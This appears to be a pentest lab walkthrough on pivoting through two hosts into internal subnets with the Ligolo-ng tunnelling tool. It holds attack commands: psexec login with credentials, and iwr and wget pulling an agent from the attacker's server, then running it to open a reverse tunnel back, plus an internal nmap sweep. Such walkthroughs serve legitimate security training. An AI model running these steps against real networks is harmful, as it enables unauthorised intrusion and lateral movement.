
# Ligolo-ng

[Ligolo-ng Github Repo](https://github.com/nicocha30/ligolo-ng) 

Ligolo-ng uses a gVisor-based userland network stack plus a TUN interface to translate local packets into remote connections via an agent, making remote networks behave like directly routed ones and allowing tools like nmap to work without proxychains. Pivoting through segmented networks and subnets, successful lateral movement is made easy with ligolo. 
Multi-hops are made easier with ligolo compared to imo proxy chains or ssh port forwarding ;) 

[Ligolo agents releases can be downloaded  here (e.g. executables)](https://github.com/nicocha30/ligolo-ng/releases) 
- windows / linux versions are both downloadable 

### Network Arch in Demo

| Machine         | IP              |
| --------------- | --------------- |
| Kali (attacker) | 192.168.xx.xxx  |
| First Hop       | 192.168.111.137 |
| Second Hop      | 10.10.111.13    |

Through the First Hop Ი︵𐑼 -> I can access the Second Hop Ი︵𐑼 Ი︵𐑼 -> Through the second hop, I can access other addresses in the subnet 

### Setup Ligolo

```
ip tuntap add user root mode tun ligolo  
ip link set ligolo up
```


- running server on port 80 to pass ligolo agent executable to target-machine-137
kali:
```
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### First hop to internal subnet! 

connect to target-machine-137 to use as first hop!
```
└─$ impacket-psexec domain/username:'password'@192.168.111.137

# download ligolo agent onto target-machine-137
PS C:\Windows\Temp> iwr -uri "http:/192.168.xx.xxx:port/ligolo-ng_agent_win.exe" -OutFile "agent.exe"

PS C:\Windows\Temp> ./agent.exe -connect 192.168.xx.xxx:11601 -ignore-cert
time="time-shown-here" level=warning msg="warning, certificate validation disabled"
time="time-shown-here" level=info msg="Connection established" addr="192.168.xx.xxx:11601"
```

kali: 
```
┌──(root㉿kali)-[/opt/ligolo-ng]
└─# ./proxy -selfcert 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 

ligolo-ng » 
ligolo-ng » INFO[0934] Agent joined.      
ligolo-ng » session
? Specify a session : 1 - NT AUTHORITY\SYSTEM@target-machine-137 - 192.168.111.137:12345 - xxxxxxxxxxx
[Agent : NT AUTHORITY\SYSTEM@target-machine-137] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ xx:xx:xx:xx:xx:xx              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.111.137/24             │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ xx:xx:xx:xx:xx:xx              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.111.254/24               │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘

```

```
# to delete route
sudo ip route del 192.168.xxx.0/24

# to replace use 
sudo ip route replace 192.168.xxx.0/24
```

```
└─$ sudo ip route add 10.10.111.0/24 dev ligolo

└─$ ip route
...
10.10.111.0/24 dev ligolo scope link 
...
```

 check  if it worked
```
└─$ nmap -v -n 10.10.111.0/24 -T4 --unprivilege
```

### Second hop for lateral movement within subnet! 

Add another ligolo :) 
```
└─$ sudo ip tuntap add user root mode tun ligolo1
└─$ sudo ip link set ligolo1 up           
```

use credentials to login to the subnet
```
└─$ ssh username@10.10.111.13     

$ wget http://192.168.xx.xxx/ligolo-ng_agent_lin
$ mv ligolo-ng_agent_lin agent
$ chmod +x agent
$ ./agent -connect 192.168.xx.xxx:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="192.168.xx.xxx:11601"
```

kali: 
```
[Agent : username@hostname] » start --tun ligolo1
INFO[1702] Starting tunnel to username@hostname (xxxxxxxxxxx) 
```

```
└─$ ip route
...
10.10.111.0/24 dev ligolo scope link 
10.20.111.0/24 dev ligolo1 scope link 
...
```

```
└─$ sudo ip route add 10.20.111.0/24 dev ligolo1
```

test the hop on a different address in the subnet 
```
└─$ ping 10.20.111.14
PING 10.20.111.14 (10.20.111.14) 56(84) bytes of data.
```

And you can just keep hopping away... 

  /)/)
( . .)
( づ♡    

<sub>source of <a href="https://emojicombos.com/bunny"> bunny ascii art  </a></sub>
